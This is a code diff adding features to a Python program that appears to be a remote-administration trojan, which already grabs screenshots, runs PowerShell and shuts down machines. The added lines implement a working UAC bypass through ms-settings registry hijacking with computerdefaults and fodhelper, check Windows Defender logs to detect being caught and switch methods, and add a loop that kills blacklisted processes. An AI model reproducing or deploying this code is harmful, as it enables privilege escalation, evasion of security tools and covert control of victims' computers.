@@ -11,6 +11,10 @@ import random
 import subprocess
 import json
 from PIL import ImageGrab
+import ctypes
+import sys
+import time
+import psutil
 #create or read device id
 def create_or_read_id_file():
     id_file_path = "ids.txt"
@@ -65,14 +69,13 @@ def get_ids():
 def read_config():
     with open("config.json", "r") as file:
         return json.load(file)
+#test if Admin
+def IsAdmin() -> bool:
+    return ctypes.windll.shell32.IsUserAnAdmin() == 1
 #make screenshot
 async def take_sc():
     # create sc
-    ImageGrab.grab(all_screens=True).save(f'{os.getcwd()}/sc.png', 'png')
-    
-
-
-    
+    ImageGrab.grab(all_screens=True).save(f'{os.getcwd()}/sc.png', 'png')    
 #shutdown and restart
 def shutdown():
     try:
@@ -93,3 +96,64 @@ def powershell(command):
         return result.stdout
     except subprocess.CalledProcessError as e:
         return f"error: {e}"
+def UACbypass(method: int = 1) -> bool:
+    if GetSelf()[1]:
+        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
+        if method == 1:
+            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("computerdefaults --nouacbypass")
+            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+            if log_count_after > log_count_before:
+                return UACbypass(method + 1)
+        elif method == 2:
+            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("fodhelper --nouacbypass")
+            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+            if log_count_after > log_count_before:
+                return UACbypass(method + 1)
+        else:
+            return False
+        return True
+def GetSelf() -> tuple[str, bool]:
+    if hasattr(sys, "frozen"):
+        return (sys.executable, True)
+    else:
+        return (__file__, False)
+def load_blacklist():
+    with open('blacklist.json', 'r') as file:
+        data = json.load(file)
+        return data['blacklisted_programs']
+def save_blacklist(blacklist):
+    with open('blacklist.json', 'w') as file:
+        json.dump({"blacklisted_programs": blacklist}, file, indent=4)
+
+# function to add to blacklist
+def add_blacklist(process_name):
+    blacklist = load_blacklist()
+    if process_name not in blacklist:
+        blacklist.append(process_name)
+        save_blacklist(blacklist)
+        return f'{process_name} added to blacklist'
+
+# function to remove from blacklist
+def remove_blacklist(process_name):
+    blacklist = load_blacklist()
+    if process_name in blacklist:
+        blacklist.remove(process_name)
+        save_blacklist(blacklist)
+        return f'{process_name} delted from blacklist'
+
+# close blacklist programms
+def monitor_blacklisted_programs():
+    while True:
+        blacklist = load_blacklist()
+        for process in psutil.process_iter(['pid', 'name']):
+            if process.info['name'] in blacklist:
+                psutil.Process(process.info['pid']).kill()
+        time.sleep(1)  # time to check
